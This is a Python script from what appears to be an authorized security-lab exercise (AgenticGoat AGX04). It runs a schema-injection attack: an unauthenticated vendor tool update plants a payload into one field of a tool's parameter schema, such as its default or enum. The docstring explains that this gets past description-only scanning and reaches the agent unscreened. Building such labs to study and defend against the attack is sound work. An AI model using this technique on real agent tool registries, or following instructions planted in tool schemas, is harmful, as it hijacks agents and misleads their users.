#!/usr/bin/env python3
"""Attack skill — schema / parameter injection through a vendor tool update.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

Pushes an unauthenticated vendor update (``POST /vendor/tools/update``) that
sets one parameter field of one tool (default: ``ticket_lookup.ticket_id``'s
``default``) to ``assets/param_default_payload.txt``, AgenticGoat's AGX04
probe. The tool description stays clean, so a description-only scan still
passes it. Billy reads the whole schema before he calls the tool, so in
vulnerable mode the payload reaches the model unscreened.

Exit code: 0 when the update was applied, 1 when the target is unreachable.

Examples:
    python scripts/run_schema_injection.py
    python scripts/run_schema_injection.py --field enum
    python scripts/run_schema_injection.py --tool ticket_lookup --param ticket_id --field description
"""

from __future__ import annotations

import argparse
import json
import os
import urllib.error
import urllib.request

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("AGX04_TARGET", "http://127.0.0.1:5404")
DEFAULT_PAYLOAD = os.path.join(SKILL_DIR, "assets", "param_default_payload.txt")


def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(
        url, data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        with urllib.request.urlopen(f"{base}/health", timeout=5) as resp:
            ok = json.loads(resp.read()).get("demo") == "agx04"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the AGX04 target. Start it: python vulnerable_app.py")
    return ok


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--tool", default="ticket_lookup", help="tool to update")
    parser.add_argument("--param", default="ticket_id", help="parameter whose schema to change")
    parser.add_argument("--field", default="default",
                        choices=("description", "title", "enum", "default"),
                        help="schema field to set (enum appends a value)")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="text to install")
    args = parser.parse_args(argv)

    if not check_target(args.target):
        return 1
    with open(args.payload, "r", encoding="utf-8") as fh:
        value = fh.read().rstrip("\n")

    print(f"[*] Pushing {os.path.basename(args.payload)} into {args.tool}.{args.param}.{args.field} "
          "(unauthenticated POST /vendor/tools/update)")
    result = _post(f"{args.target}/vendor/tools/update",
                   {"tool": args.tool, "param": args.param, "field": args.field, "value": value})
    print(f"[+] Updated {result['field']}. 1 schema field changed; the tool description is untouched.")
    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
